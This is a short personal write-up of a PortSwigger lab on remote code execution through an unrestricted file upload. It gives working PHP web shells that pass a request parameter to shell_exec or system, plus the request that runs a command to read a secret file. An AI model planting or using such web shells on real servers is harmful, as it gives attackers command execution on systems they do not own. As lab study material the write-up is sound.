# [Remote code execution via web shell upload] — [PortSwigger] — [Apprentice]
**Date:** 2026-06-15
 
---
 
## Vulnerability / core concept
Unrestricted File Upload

## What made me stuck
This level was pretty easy and I solved it pretty quickly.
 
## What unblocked me
`null`
 
---


## Attack path
1) First we need to log in to our account to access file upload functionalitiy.
2) During inspection, we can notice that this web application does not validate the type of file we are uploading. Therefore, we can upload a malicious `.php` file and web application will still accept it.
3) I did quick look up for `.php` web shell scripts and uploaded it to this web app.
4) What I did next was checking whether application executes the code and it does! This way I gained remote code execution to the server and can execute arbitrary commands. All we need to do is to execute `cat /home/carlos/secret` command to retrieve the secret key and submit it to solve the lab.

---


## Payload / key command
The payload that I used was this one:
```php
<?php
if(isset($_GET['cmd'])) {
    echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
}
?>
```
However, there are shorter and better ones that I found later:
```php
<?php echo system($_GET['command']); ?>
```
After uploading this script, we need to send the following request:
```bash
GET /files/avatars/filename.php?cmd=cat%20/home/carlos/secret HTTP/1.1
...
```

---


## What I'd recognize faster next time
It is important to check whether web application restricts the type, size, or content of uploaded file. If it doesn't, this can lead to very serious vulnerabilities such as remote code execution.
 

